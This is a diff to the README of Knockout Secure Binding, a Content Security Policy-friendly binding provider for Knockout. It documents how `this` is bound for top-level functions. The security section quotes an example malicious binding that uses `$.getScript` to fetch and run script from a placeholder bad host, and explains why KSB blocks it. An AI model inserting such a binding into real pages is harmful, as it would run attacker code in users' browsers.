@@ -93,8 +93,12 @@ Sbind language is closer to JSON than Javascript, so it's easier to describe its
 1. it understands the `undefined` keyword;
 2. it looks up variables on `$data` or `$context` or `globals` (in that order);
 3. functions can be called (but do not accept arguments);
-4. a subset of Javascript expressions are available (see below);
-5. observables that are part of expressions are automatically unwrapped for convenience.
+4. top-level functions are called with `this` set to an object with the following keys: `$data`, `$context`, `globals`, `$element`, corresponding to the state for the respective element bound. †
+5. a subset of Javascript expressions are available (see below);
+6. observables that are part of expressions are automatically unwrapped for convenience.
+
+† Note that this is a deviation from the ordinary Knockout behaviour, where
+`this` would be `window` (unless the function is otherwise bound).
 
 KSB provider uses Knockout's built-in bindings, so `text`, `foreach`, and all the others should work as expected. It also works with virtual elements.
 
@@ -136,8 +140,7 @@ By using KSB in place of the regular binding provider one can continue use
 Knockout in an environment with a Content Security Policy. This includes for example [Chrome web apps](http://developer.chrome.com/apps/contentSecurityPolicy.html).
 
 Independent of a Content Security Policy, KSB prevents the execution of arbitrary code in a Knockout binding. A malicious script such as
-`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However this script
-will not execute in KSB because:
+`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However this script will not execute in KSB because:
 
 1. The `$` is a global, and unless explicitly added to the binding context it will not be accessible;
 2. Functions in KSB do not accept arguments;
